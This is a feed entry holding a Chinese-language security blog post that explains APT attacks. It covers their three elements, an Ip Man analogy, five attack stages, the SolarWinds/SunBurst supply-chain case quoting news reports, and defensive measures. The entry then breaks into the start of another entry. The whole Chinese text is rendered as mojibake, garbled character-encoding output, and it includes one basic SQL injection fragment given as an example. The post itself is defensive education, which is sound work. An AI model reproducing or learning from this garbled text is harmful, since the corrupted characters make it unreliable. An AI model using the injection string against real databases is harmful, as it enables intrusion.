ä¸¦ä¸æ˜¯ä¸€ç¨®æ”»æ“Šæ‰‹æ³•ï¼Œè€Œæ˜¯ä¸€æ•´å¥—çš„æ”»æ“Šæ‰‹æ³•åŠæµç¨‹å½™æ•´ï¼Œèˆ‰å€‹ä¾‹ä¾†èªªï¼Œè‘‰å•é–‹å§‹å­¸ç¿’æ­¦è¡“ï¼Œæ”»æ“Šçš„æ‰‹æ³•ä¸å¤–ä¹ä¾¿æ˜¯å·¦å‹¾æ‹³ï¼ˆPhishingï¼‰ã€å³å‹¾æ‹³ï¼ˆOS injectionï¼‰ï¼Œè€Œç•¶ä»–å°‡é€™äº›æ”»æ“Šé€²è¡Œ<strong>è®ŠåŒ–</strong>ä¸¦ä¸”<strong>æ•´åˆ</strong>èµ·ä¾†ï¼Œæ‘¸ç´¢å‡ºå…‹æ•µä¹‹é“æˆç‚ºæµæ´¾ä¹‹å¾Œï¼Œä¾¿å¯ä»¥ç¨±ä¹‹ç‚º è© æ˜¥ï¼ˆAPTï¼‰ï¼ï¼Œé¡å¤–èªªæ˜ä¸€ä¸‹ APT èˆ‡æ”»æ“Šéˆæ¦‚å¿µå¾ˆåƒï¼Œæ‰€ä»¥æˆ‘æœƒåœ¨ä¸‹é¢èªªæ˜ APT æ‰€æ“æœ‰çš„è¦ç´ å’Œæ¡ˆä¾‹èªªæ˜ã€‚</p>\n<p><figure><img src=\"/img/posts/jo/zerobased-APT/p1.jpeg\" /><figcaption><p>photo by é›»å½±-è‘‰å•</p>\n</figcaption></figure></p>\n<h2 id=\"apt%EF%BC%88advanced-persistent-threat%EF%BC%89%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F\"><a class=\"direct-link\" href=\"#apt%EF%BC%88advanced-persistent-threat%EF%BC%89%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F\">#</a> APTï¼ˆAdvanced Persistent Threatï¼‰æ˜¯ä»€éº¼ï¼Ÿ</h2>\n<p>é–‹å®—æ˜ç¾©ï¼ŒAPT å°±æ˜¯ä»¥<strong>é€²éšæœ‰è®ŠåŒ–</strong>çš„æ”»æ“Šæ‰‹æ³•ï¼Œ<strong>æŒçºŒä¸¦å˜—è©¦ä¸è¢«ç™¼ç¾</strong>çš„å…¥ä¾µç›®æ¨™ï¼Œä¸¦ä¸”ç«Šå–è³‡æ–™æŒæ§ç³»çµ±<strong>å°ç›®æ¨™é€ æˆå¨è„…</strong>ã€‚</p>\n<h3 id=\"%E4%B8%8A%E9%9D%A2%E6%8F%90%E5%88%B0-apt-%E9%80%9A%E5%B8%B8%E6%9C%83%E5%8C%85%E5%90%AB%E4%B8%89%E7%A8%AE%E8%A6%81%E7%B4%A0%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E4%B8%8A%E9%9D%A2%E6%8F%90%E5%88%B0-apt-%E9%80%9A%E5%B8%B8%E6%9C%83%E5%8C%85%E5%90%AB%E4%B8%89%E7%A8%AE%E8%A6%81%E7%B4%A0%EF%BC%9A\">#</a> ä¸Šé¢æåˆ° APT é€šå¸¸æœƒåŒ…å«ä¸‰ç¨®è¦ç´ ï¼š</h3>\n<p><strong>1.é€²éšæ€§ï¼ˆAdvancedï¼‰</strong><br>\n<strong>ä¸Šå‹¾æ‹³ç„¡æ³•æ‰“æ•—å°æ‰‹ï¼Œä½†æ˜‡é¾æ‹³å¯ä»¥</strong><br>\nä¸€èˆ¬ä½¿ç”¨å·¥å…·åŸ·è¡Œçš„æ”»æ“Šæ‰‹æ³•ï¼Œä¾‹å¦‚ SQL Injection çš„ OR 1=1--' ä¾¿ä¸ç®—æ˜¯ä¸€ç¨®é€²éšçš„æ”»æ“Šæ‰‹æ³•ï¼Œè‹¥åŒæ¨£ä»¥ SQL Injection ä¾†èˆ‰ä¾‹ï¼Œå¯èƒ½ä¾¿æ˜¯é€éå…¬å¸çš„<strong>ç¶²è·¯æ›éšª</strong>å’Œç›¸é—œçš„æ¸¬è©¦æ‰¾å‡ºå…¬å¸ä½¿ç”¨çš„è³‡æ–™åº«é¡å‹ä»¥åŠç‰ˆæœ¬ï¼Œç”šè‡³å¾éŒ¯èª¤è¨Šæ¯ä¸­ç²å¾—è³‡è¨Šï¼Œè—‰ä»¥æ§‹å»ºé‡å°ç›®æ¨™çš„ SQL Injection  payloadï¼Œä¾¿å¯ä»¥ç¨±ç‚ºä¸€ç¨®é€²éšçš„æ‰‹æ³•ã€‚</p>\n<p><strong>2.æŒçºŒæ€§ï¼ˆPersistentï¼‰</strong><br>\n<strong>ç›´æ¥æ”¾å¤§çµ•æ‹›å®¹æ˜“è¢«é–ƒèº²ï¼Œæ‰€ä»¥æŒçºŒä¸æ–·çš„è©¦æ¢ï¼Œè®“å°æ‰‹éœ²å‡ºç ´ç¶»</strong><br>\nå°±åƒæ˜¯å¤§é–‹å¤§é—”çš„æ”»æ“Šç¸½æ˜¯ç‰¹åˆ¥å®¹æ˜“è¢«é˜»æ“‹ï¼Œå› æ­¤è—‰ç”±ç·©æ…¢è€Œä½èª¿çš„å„ç¨®æ¸¬è©¦å’Œæ”¶é›†è³‡è¨Šæ–¹å¼ï¼Œæ…¢æ…¢çš„å°‹æ‰¾çªç ´å£ï¼Œä¸æ±‚å¿«é€Ÿæœ‰æˆæ•ˆï¼Œåªæ±‚æŒçºŒè€Œä¸”ä¸è¢«ç™¼ç¾ä¾¿å¯ä»¥ç¨±ç‚ºæŒçºŒæ€§ã€‚</p>\n<p><strong>3.å¨è„…æ€§ï¼ˆThreatï¼‰</strong><br>\n<strong>æ”»æ“Šä¸€å®šæœƒé€ æˆå‚·å‹¢ï¼Œæ”»æ“Šå¯èƒ½é€ æˆçš„å‚·å‹¢è¶Šé‡è¡¨ç¤ºå¨è„…æ€§è¶Šé«˜</strong><br>\né§­å®¢æ”»æ“Šä¸€å®šæœ‰ç›®çš„ï¼Œç„¡è«–æ˜¯ç›´æ¥é€éå‹’ç´¢è»Ÿé«”è—‰æ­¤å‹’ç´¢è´–é‡‘ï¼Œæˆ–æ˜¯ç«Šå–å•†æ¥­æ©Ÿå¯†è³‡æ–™ä¾†ç²å–åˆ©ç›Šï¼Œç”šè‡³æ˜¯ç ´å£å…¬å¸çš„æœå‹™æˆ–æ˜¯å®¢æˆ¶è³‡æ–™é€ æˆå•†è­½å—æï¼Œé€™äº›éƒ½æ˜¯æ‰€è¬‚çš„å¨è„…æ€§ã€‚</p>\n<p><figure><img src=\"/img/posts/jo/zerobased-APT/p2.jpeg\" /><figcaption><p>photo by pexels</p>\n</figcaption></figure></p>\n<h3 id=\"apt-%E6%9C%89%E5%93%AA%E4%BA%9B%E9%9A%8E%E6%AE%B5\"><a class=\"direct-link\" href=\"#apt-%E6%9C%89%E5%93%AA%E4%BA%9B%E9%9A%8E%E6%AE%B5\">#</a> APT æœ‰å“ªäº›éšæ®µ</h3>\n<p>ç°¡åŒ–ä¾†èªªå¯ä»¥åˆ†æˆäº”å€‹éšæ®µ<br>\n<strong>é¸æ“‡ç›®æ¨™ï¼š</strong><br>\næ­¤éšæ®µæœ‰å„ç¨®å¯èƒ½æ€§ï¼Œç„¡è«–æ˜¯å› ç‚ºä¼æ¥­æ›å…‰ç‡é«˜ï¼Œæˆ–æ˜¯ç«¶çˆ­å°æ‰‹çš„åƒ±å‚­ç”šè‡³æ˜¯ç¶²è·¯æ›éšªçš„è³‡è¨Šéƒ½æœ‰å¯èƒ½å°è‡´ä¼æ¥­æˆç‚ºé§­å®¢çš„æ”»æ“Šæ¨™çš„ã€‚</p>\n<p><strong>æ”¶é›†è³‡è¨Šï¼š</strong><br>\né€éå„å¼å„æ¨£çš„å·¥å…·ä»¥åŠæ”»æ“Šæ‰‹æ³•ï¼Œæ”¶é›†æ”»æ“Šç›®æ¨™å¯èƒ½å°è‡´é¢¨éšªçš„å¼±é»ã€‚</p>\n<p><strong>åŸ·è¡Œæ»²é€ï¼š</strong><br>\nå˜—è©¦å°‡æ‰€æœ‰æ”¶é›†åˆ°çš„å¼±é»ä¸²èµ·ï¼ŒåŸ·è¡Œæ”»æ“ŠéŠé”æˆéšæ®µæ€§çš„ç›®çš„ï¼Œä¾æ“šä¸åŒçš„æœ€çµ‚ç›®çš„ï¼Œæ­¤éšæ®µçš„ç›®æ¨™éƒ½å¯èƒ½ä¸åŒï¼Œå¯èƒ½æ˜¯ç²å–å…§éƒ¨çš„å¸³è™Ÿä»¥åŠå°‡å¸³è™Ÿçš„æ¬Šé™æé«˜ï¼Œæˆ–è€…æ˜¯æ§åˆ¶é˜²ç¦¦æ©Ÿåˆ¶ï¼Œä¹Ÿå¯èƒ½æ˜¯æ¤å…¥å¾Œå°æ”¶é›†è³‡è¨Šï¼Œæˆ–æ˜¯å°‡æ•£æ’­æƒ¡æ„è…³æœ¬ï¼Œæ­¤éšæ®µé€šå¸¸éœ€è¦èŠ±è²»è¨±å¤šçš„æ™‚é–“é€²è¡ŒæŒçºŒæ€§çš„æ¸¬è©¦ï¼Œä¸¦ä¸”å¿…é ˆä½èª¿ä¸èƒ½è¢«ç™¼ç¾ã€‚</p>\n<p><strong>åˆ†æè³‡è¨Šï¼š</strong><br>\nè—‰ç”±åœ¨å…§éƒ¨ä¸­æ»²é€å¾Œç²å–çš„è³‡æ–™é€²è¡Œåˆ†æï¼Œæ­¤éšæ®µç²å–çš„è³‡è¨Šæœ‰å¯èƒ½æ˜¯é€éå¸³è™Ÿææ¬Šè€Œç²å¾—çš„è³‡è¨Šï¼Œåˆæˆ–è€…æ˜¯åŸ‹å…¥å¾Œé–€ä¹‹å¾Œé•·æœŸæ”¶é›†çš„è³‡è¨Šé€²è¡Œåˆ†æï¼Œä¹Ÿå¯èƒ½æ˜¯æ¼¸é€²æ€§çš„ç¤¾äº¤å·¥ç¨‹ï¼Œç”±æ™®é€šå“¡å·¥åˆ°äººè³‡åˆ°ç®¡ç†éšå±¤å¾Œæ”¶é›†åˆ°çš„è³‡è¨ŠåŸ·è¡Œåˆ†æï¼Œç¢ºèªé€™äº›è³‡è¨Šæ˜¯å¦è¶³å¤ è®“é§­å®¢é”æˆæœ€çµ‚ç›®çš„ã€‚</p>\n<p><strong>ç²å–æˆæœï¼š</strong><br>\nåœ¨é€™å€‹éšæ®µå°±æ˜¯å¤§å®¶åœ¨é›»å½±ä¸­æ‰€çœ‹åˆ°çš„ï¼Œé§­å®¢æ•²æ“Šå¹¾åˆ†é˜çš„éµç›¤ï¼Œä¾¿çœ‹åˆ°ç³»çµ±è¢«é§­å®¢å®Œå…¨æŒæ§ï¼Œæˆ–è€…æ˜¯æ©Ÿå¯†è³‡æ–™é€šé€šè¢«ä¸‹è¼‰å‚™ä»½ã€‚</p>\n<p><figure><img src=\"/img/posts/jo/zerobased-APT/p3.jpeg\" /><figcaption><p>photo by pexels</p>\n</figcaption></figure></p>\n<h3 id=\"%E5%AF%A6%E4%BE%8B%E8%AA%AA%E6%98%8E\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E4%BE%8B%E8%AA%AA%E6%98%8E\">#</a> å¯¦ä¾‹èªªæ˜</h3>\n<p>ä»¥å»å¹´æœ€æœ‰åçš„ SolarWinds ä¾›æ‡‰éˆæ”»æ“Šä¾†èªªæ˜ä»¥ä¸Šéšæ®µï¼Œé€™å€‹æ”»æ“Šäº‹ä»¶å—å®³è€…åŒ…æ‹¬å…¨çƒæœ€å¤§å®‰å…¨è»Ÿé«”å…¬å¸ä¹‹ä¸€FireEyeä»¥åŠç¾åœ‹è²¡æ”¿éƒ¨èˆ‡å•†å‹™éƒ¨ï¼Œä»¥ä¸‹å¼•è™Ÿç‚ºå¼•ç”¨æ–°èå…§å®¹ï¼Œèªªæ˜çµæŸå¾Œæœƒé™„ä¸Šæ–°èé€£çµã€‚</p>\n<blockquote>\n<p>â€SolarWindsè‡ª2020å¹´3æœˆåˆ°6æœˆä¹‹é–“ï¼Œæ¨å‡ºçš„ Orion è»Ÿé«”å­˜åœ¨åç‚º SunBurst çš„å¾Œé–€ï¼Œé§­å®¢ç”¨ä¾†æ–¼é­æ„ŸæŸ“çš„ç³»çµ±ç›£æ§å—å®³çµ„ç¹”ï¼ŒåŒæ™‚èƒ½å¤ åŸ·è¡Œä»»æ„æŒ‡ä»¤ã€‚â€œ</p>\n</blockquote>\n<p><strong>é¸æ“‡ç›®æ¨™ï¼š</strong></p>\n<blockquote>\n<p>â€œSolarWindsæ˜¯ç¾åœ‹çš„è»Ÿé«”é–‹ç™¼å•†ï¼Œç ”ç™¼ç¶²è·¯ç³»çµ±åŠè³‡è¨Šç§‘æŠ€åŸºç¤è¨­æ–½çš„è»Ÿé«”ï¼Œæ ¹æ“šå®˜ç¶²èªªæ˜ï¼Œå®¢æˆ¶åŒ…æ‹¬å…¨ç¾äº”ç™¾å¤§ä¼æ¥­ä¸­çš„425å®¶ã€å‰åå¤§é›»ä¿¡æ¥­è€…ã€ç¾åœ‹è»æ–¹ã€ç¾åœ‹åœ‹é˜²éƒ¨ã€åœ‹å‹™é™¢ã€NSASã€åœ‹å®‰å±€ã€éƒµæ”¿æœå‹™ã€å¸æ³•éƒ¨ï¼Œä»¥åŠç¾åœ‹ç¸½çµ±è¾¦å…¬å®¤ã€‚â€</p>\n</blockquote>\n<p>é€™è£å¯ä»¥ç¢ºå®šçš„æ˜¯ç›®æ¨™å¦‚æœå¾—æ‰‹ï¼Œç­‰æ–¼é–“æ¥ç²å–è¨±å¤šå¤§ä¼æ¥­çš„æ©Ÿæ•è³‡è¨Šï¼Œè‡³æ–¼ç‚ºä»€éº¼æœƒé¸æ“‡ SolarWinds å°±ä¸å¾—è€ŒçŸ¥ï¼Œæœ‰å¯èƒ½æ˜¯é€éå±¤å±¤çš„ç¯©é¸ç›®æ¨™ï¼ŒåŒ…å«æ”»æ“ŠæˆåŠŸå¯èƒ½æ€§ä»¥åŠç¶²è·¯æ›éšªç¨‹åº¦ä»¥åŠè³‡æ–™ä¿è­·ç¨‹åº¦è€Œå®šã€‚</p>\n<p><strong>æ”¶é›†è³‡è¨Šï¼š</strong></p>\n<p>å¦‚ä¸Šä¸€éšæ®µæ‰€èªªï¼Œæ­¤éšæ®µèˆ‡<strong>é¸æ“‡ç›®æ¨™</strong>ç¿’ç¿’ç›¸é—œï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œé§­å®¢å¯èƒ½æœ€åˆæ˜¯é–å®šäº†ç¾åœ‹å¹¾å¤§çŸ¥åçš„è»Ÿé«”é–‹ç™¼å•†ï¼Œæ¥è‘—é€éå„å¼å„æ¨£çš„å·¥å…·ä»¥åŠæ”»æ“Šæ‰‹æ³•ï¼Œæ”¶é›†æ”»æ“Šç›®æ¨™å¯èƒ½å°è‡´é¢¨éšªçš„å¼±é»ï¼Œå»åˆ¤æ–·æ”»æ“ŠæˆåŠŸå¯èƒ½æ€§ä»¥åŠç¶²è·¯æ›éšªç¨‹åº¦ä»¥åŠè³‡æ–™ä¿è­·ç¨‹åº¦ä¹‹å¾Œï¼Œæ‰é¸æ“‡æœ€çµ‚ç›®æ¨™ï¼Œæ¥è‘—å†å¼·åŒ–æ”¶é›†è³‡è¨Šã€‚</p>\n<p><strong>åŸ·è¡Œæ»²é€ï¼š</strong></p>\n<blockquote>\n<p>&quot; SolarWinds æ–¼2019å¹´10æœˆæ¨å‡ºçš„èˆŠç‰ˆæœ¬ï¼ˆ2019.4.5200.8890ç‰ˆï¼‰è£¡ï¼Œé§­å®¢å·²ç¶“é–‹å§‹å° Orion çš„ç¨‹å¼é€²è¡Œå°å¹…åº¦ä¿®æ”¹ï¼ŒåŠ å…¥äº†å¾Œä¾†æ‰ç”¨åˆ°çš„.NETé¡åˆ¥ï¼ˆOrionImprovement BusinessLayerï¼‰ï¼Œè€Œæ­¤æ™‚ï¼Œé§­å®¢å°šæœªæ¤å…¥å¾Œé–€çš„ç¨‹å¼ç¢¼ï¼ŒReversingLabsæŒ‡ å‡ºï¼Œé€™å€‹éšæ®µçš„ç¨‹å¼ç¢¼ç«„æ”¹ï¼Œå¾ˆæ˜é¡¯åªæ˜¯æ¦‚å¿µæ€§é©—è­‰æ”»æ“Šï¼ˆPoCï¼‰ã€‚<br>\né§­å®¢å¤§è‡´çš„æ”»æ“Šè¨ˆç•«ï¼Œå¯å€åˆ†æˆ3å€‹éšæ®µï¼šé¦–å…ˆï¼Œæ˜¯é§­å…¥é–‹ç™¼ç³»çµ±ï¼Œä¸€æ—¦æˆåŠŸï¼Œæ”»æ“Šè€…æ¥è‘—æœƒæ³¨å…¥è‡ªå·±çš„ç¨‹å¼ç¢¼ï¼Œæœ€å¾ŒæŸ¥æ ¸ä»–å€‘ç°½ç½²çš„è»Ÿé«”å¥—ä»¶ï¼Œæ˜¯å¦æœƒæ´¾é€åˆ° Orion è»Ÿé«”çš„ç”¨æˆ¶ç«¯ã€‚<br>\nåœ¨é§­å®¢æ¤å…¥æƒ¡æ„ç¨‹å¼ç¢¼çš„éç¨‹ä¸­ï¼Œç‚ºäº†è¦çé  SolarWins çš„é–‹ç™¼äººå“¡ï¼Œä¸è®“æ”»æ“Šè¡Œå‹•è¢«å¯Ÿè¦ºï¼Œä»–å€‘æ•…æ­¥ç–‘é™£ï¼Œæ¡å–äº†è¨±å¤šå¹¾å¯äº‚çœŸçš„åšæ³•ï¼Œä¾†æ¨¡ä»¿ SolarWinds é–‹ç™¼æ–¹å¼ã€‚<br>\nä¾‹å¦‚ï¼Œåœ¨åŠ å…¥ Orion ç¨‹å¼ç¢¼çš„å…¶ä¸­ä¸€å€‹é¡åˆ¥ï¼Œå…¶åç¨±é§­å®¢å°±åˆ»æ„å‘½åç‚º OrionImprovement BusinessLayerï¼Œè€Œè®“è©²å…¬å¸çš„è»Ÿé«”é–‹ç™¼è€…èˆ‡ç¨½æ ¸äººå“¡ï¼Œèªç‚ºæ˜¯æ­£å¸¸çš„ç‰©ä»¶ã€‚<br>\né§­å®¢ä¸åªæ˜¯æ¨¡ä»¿ SolarWinds é–‹ç™¼åœ˜éšŠçš„ç‰©ä»¶å‘½åæ–¹å¼ï¼ŒReversingLabs é€²ä¸€æ­¥æŒ‡å‡ºï¼Œé§­å®¢é‚„åœ¨æ­¤é¡åˆ¥ä¸­ï¼Œå¼•ç”¨äº†ç¢ºå¯¦å­˜åœ¨æ–¼ Orion ç¨‹å¼ç¢¼çš„æ–¹æ³•ï¼ˆMethodï¼‰èˆ‡ç¨‹å¼åº«ï¼Œè€Œé€™æ¨£çš„ç²¾ç´°æ‰‹æ³•ï¼ŒåŒæ¨£å­˜åœ¨æ–¼é€™äº›é§­å®¢å…¶ä»–æ¤å…¥çš„æ–¹æ³•ã€‚ç”±æ­¤å¯è¦‹ï¼Œé§­å®¢æ‡‰è©²å°æ–¼ SolarWinds åŸºç¤ç¨‹å¼åº«çš„æ¶æ§‹ï¼Œå¯èªªæ˜¯æ¥µç‚ºç†Ÿæ‚‰ã€‚â€œ</p>\n</blockquote>\n<p>é™¤äº†ç²å¾—é§­å…¥é–‹ç™¼ç³»çµ±çš„æ¬Šé™ï¼Œä¹Ÿè¨±æ˜¯é€éç¤¾äº¤å·¥ç¨‹æˆ–æ˜¯é€éæœå‹™é€†å‘ç²å–æ¬Šé™ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°é§­å®¢ç‚ºäº†åŸ·è¡Œæ”»æ“Šï¼ŒèŠ±æ™‚é–“äº†è§£ SolarWinds åŸºç¤ç¨‹å¼åº«çš„æ¶æ§‹ä¸¦æ¨¡ä»¿ç‰©ä»¶å‘½åæ–¹å¼ä¸¦å¼•ç”¨ç¢ºå¯¦å­˜åœ¨æ–¼ Orion ç¨‹å¼ç¢¼çš„æ–¹æ³•ï¼ˆMethodï¼‰èˆ‡ç¨‹å¼åº«ï¼Œä»¥ä¸Šçš„æ”»æ“Šéƒ½æ˜¯éœ€è¦èŠ±è²»è¨±å¤šçš„æ™‚é–“ç ”ç©¶ä¸¦ä¸”åŸ·è¡Œå¤šæ¬¡çš„æ¸¬è©¦æ‰æœ‰å¯èƒ½æˆåŠŸã€‚</p>\n<p><strong>åˆ†æè³‡è¨Šï¼š</strong><br>\nåœ¨é€™å€‹æ”»æ“Šäº‹ä»¶ä¸­ï¼Œé§­å®¢åœ¨æ”»æ“Šéç¨‹éœ€è¦ä¸æ–·çš„å­¸ç¿’ SolarWinds åŸºç¤ç¨‹å¼åº«çš„æ¶æ§‹ï¼Œä¸¦ä¸”ç¢ºä¿è‡ªå·±çš„ä¿®æ”¹æ²’æœ‰è¢«ç™¼ç¾ï¼Œä¸æ–·çš„åŸ·è¡Œ POC ï¼Œåˆ†æçµæœä¸¦ç¢ºèªæ”»æ“Šçš„æœ‰æ•ˆæ€§ï¼Œä¸¦ä¸”é€éä¸€æ¬¡æ¬¡çš„ POC ï¼Œå¾ä¸­ç²å¾—è³‡è¨Šï¼Œåè¦†çš„åˆ†æå’Œä¿®æ”¹æ”»æ“Šæ‰‹æ³•ã€‚</p>\n<p><strong>ç²å–æˆæœï¼š</strong><br>\næœ€å¾Œåœ¨è¨±å¤šæ–°èå ±å°åŠäº‹ä»¶ç ”ç©¶ä¸­å¯ä»¥çœ‹åˆ°ï¼Œé§­å®¢é™¤äº†ç²å–äº† FireEye çš„ç´…éšŠæ¸¬è©¦å·¥å…·ä»¥å¤–ï¼Œä¹Ÿç²å–äº†ç‰¹å®šæ”¿åºœå®¢æˆ¶çš„è³‡æ–™ï¼Œä¸¦ä¸”ä¹ŸæˆåŠŸå­˜å–ã€Œéƒ¨ä»½ã€å…§éƒ¨ç³»çµ±ã€‚</p>\n<p><strong>åƒè€ƒè³‡æ–™é€£æ¥ï¼š</strong></p>\n<blockquote>\n<p><a href=\"https://www.ithome.com.tw/news/141651\">å ±å°ï¼šåœ‹å®¶ç´šé§­å®¢é€éä¾›æ‡‰éˆæ”»æ“Šç¾åœ‹è²¡æ”¿éƒ¨èˆ‡å•†å‹™éƒ¨</a><br>\n<a href=\"https://www.ithome.com.tw/news/141753\">è³‡å®‰å» å•†åˆ†æ SolarWinds ä¾›æ‡‰éˆæ”»æ“Šå¾Œé–€ç¨‹å¼ï¼Œç ”åˆ¤é§­å®¢è‡ªå»å¹´åº•é–‹å§‹æ”»æ“Š</a></p>\n</blockquote>\n<p><figure><img src=\"/img/posts/jo/zerobased-APT/p4.jpeg\" /><figcaption><p>photo by pexels</p>\n</figcaption></figure></p>\n<h2 id=\"apt-%E6%9C%89%E8%BE%A6%E6%B3%95%E9%98%B2%E7%A6%A6%E5%97%8E%EF%BC%9F\"><a class=\"direct-link\" href=\"#apt-%E6%9C%89%E8%BE%A6%E6%B3%95%E9%98%B2%E7%A6%A6%E5%97%8E%EF%BC%9F\">#</a> APT æœ‰è¾¦æ³•é˜²ç¦¦å—ï¼Ÿ</h2>\n<p>é›–ç„¶ APT æ”»æ“Šæœ‰é‡å°æ€§è€Œä¸”å®¢è£½åŒ–çš„ç‰¹æ€§ï¼Œèˆ‡ä¸€èˆ¬é˜²æ¯’è»Ÿé«”èˆ‡é˜²ç«ç‰†çš„åµæ¸¬ç‰¹å¾µç¢¼çš„é˜²è­·æ©Ÿåˆ¶ä¸ç›¡ç›¸åŒï¼Œä¹Ÿå› ç‚ºæ“æœ‰å¦‚æ­¤å¤šå‹æ…‹å’Œé¢å‘ï¼Œæ‰€ä»¥å°æ–¼ä¼æ¥­ä¾†èªªååˆ†é›£ä»¥é é˜²ï¼Œä¸éå…¶å¯¦ä»ç„¶èƒ½å¤ å¾å¹¾å€‹æ–¹é¢ä¾†æé«˜é§­å®¢æˆåŠŸå…¥ä¾µçš„é›£åº¦ï¼š</p>\n<ol>\n<li>å°æ–¼å¨è„…æƒ…è³‡å’Œæ¼æ´è³‡è¨Šçš„äº†è§£ï¼Œé€²è¡Œé¢¨éšªç®¡ç†ï¼ŒæŒæ¡ç³»çµ±æ¼æ´ä¿®è£œåŠè»Ÿé«”ç‰ˆæœ¬æ›´æ–°ã€‚</li>\n<li>é‡å°ä¼æ¥­å…§éƒ¨æ‰€æœ‰çš„æ¬Šé™æ©Ÿåˆ¶é€²è¡Œæ§ç®¡ï¼Œç´°åŒ–æ¯å€‹äººæ“æœ‰çš„æ¬Šé™ã€‚</li>\n<li>åŸ·è¡Œäº‹ä»¶è¨˜éŒ„åŒ…æ‹¬ä¿ç•™ç³»çµ±åŠæª”æ¡ˆä¼ºæœå™¨çš„å­˜å–ç´€éŒ„ï¼Œç¢ºä¿å•é¡Œç™¼ç”Ÿæ™‚ï¼Œèƒ½ç¬¬ä¸€æ™‚é–“ç™¼ç¾ä¸¦è¿½è¹¤å•é¡Œã€‚</li>\n<li>åŸ·è¡Œå¦‚ç¤¾äº¤å·¥ç¨‹æ¼”ç·´çš„è³‡å®‰æ¸¬è©¦åŠèª²ç¨‹ï¼Œå¼·åŒ–å…¨å“¡è³‡å®‰æ„è­˜ã€‚</li>\n<li>å®šæœŸåŸ·è¡Œç¶²è·¯æ›éšªä»¥åŠå¼±é»æƒæã€æ»²é€æ¸¬è©¦ç­‰ï¼Œç¢ºä¿ä¼æ¥­å°æ–¼è‡ªèº«æœå‹™ä»¥åŠç‹€æ…‹ï¼Œé™¤äº†æé«˜é§­å®¢çš„æ”»æ“Šé›£åº¦ä»¥å¤–ï¼Œä¹Ÿèƒ½åœ¨å±¤å±¤ç¯©é¸ä¸­é¿å…æˆç‚ºæœ€çµ‚æ¨™çš„ã€‚</li>\n</ol>\n<h2 id=\"%E5%B0%8F%E7%B5%90\"><a class=\"direct-link\" href=\"#%E5%B0%8F%E7%B5%90\">#</a> å°çµ</h2>\n<p>ä»‹ç´¹äº†ä»€éº¼æ˜¯ APT ï¼Œä¹Ÿä»¥å¯¦ä¾‹èªªæ˜æµç¨‹ä¹‹å¾Œï¼Œä¹Ÿè¨±æœ‰äººæœƒç”¢ç”Ÿé€™æ ¹æœ¬é˜²ä¸å‹é˜²çš„ç„¡åŠ›æ„Ÿï¼Œä¸éé­”é«˜ä¸€å°ºé“é«˜ä¸€ä¸ˆï¼Œå…¶å¯¦å·²ç¶“æœ‰çµ„ç¹”åˆ†æäº†çŸ¥åçš„é§­å®¢çµ„ç¹” APT æ‰‹æ³•ï¼Œä¸¦ä¸”å°‡é€™äº›æ‰‹æ³•åˆ†é¡æ­¸ç´ï¼Œä»¥æ­¤å»ºç«‹è³‡å®‰æ¡†æ¶ï¼Œé™¤äº†å°‡å¨è„…å’Œå…¥ä¾µçš„æè¿°ä¸€è‡´åŒ–ä»¥å¤–ï¼Œä¹Ÿæœ‰åŠ©æ”»é˜²æ¼”ç·´ä»¥åŠè³‡å®‰ç”¢å“çš„é©—è­‰ï¼Œè€Œé€™å…¶å¯¦ä¹Ÿæ˜¯æˆ‘ä¸‹ä¸€ç¯‡æ–‡ç« æƒ³è¦èªªæ˜çš„é‡é»ï¼Œå¸Œæœ›å¯ä»¥è®“å¤§å®¶å°æ–¼ APT æœ‰æ›´å……åˆ†çš„äº†è§£ï¼Œå»ºç«‹æ›´è±å¯Œçš„è³‡å®‰çŸ¥è­˜åº«ã€‚</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> å»¶ä¼¸é–±è®€</h2>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-exposure/\">è³‡å®‰ç§‘æ™®ç•ªå¤–ç¯‡ï¼ˆä¸€ï¼‰-å¤§æ„äº†å•Šæ²’æœ‰é–ƒï¼å¸¸è¦‹ç¶²ç«™æ›éšªä½ ä¸­äº†å¹¾é …ï¼Ÿï¼</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-fix/\">è³‡å®‰ç§‘æ™®ç•ªå¤–ç¯‡ï¼ˆäºŒï¼‰-å¦‚ä½•æœ‰æ•ˆç‡é¸æ“‡é¢¨éšªé€²è¡Œä¿®å¾© feat.é¢¨éšªå’Œæ³•è¦æ¯æ¯ç›¸é—œï¼Ÿï¼</a></p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> åƒè€ƒè³‡æ–™</h2>\n<blockquote>\n<p><a href=\"https://www.ithome.com.tw/news/141753\">è³‡å®‰å» å•†åˆ†æ SolarWinds ä¾›æ‡‰éˆæ”»æ“Šå¾Œé–€ç¨‹å¼ï¼Œç ”åˆ¤é§­å®¢è‡ªå»å¹´åº•é–‹å§‹æ”»æ“Š</a></p>\n</blockquote>\n",
      "date_published": "2021-08-22T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/",
      "title": "å¾ cdnjs çš„æ¼æ´ä¾†çœ‹å‰ç«¯çš„ä¾›æ‡‰éˆæ”»æ“Šèˆ‡é˜²ç¦¦",
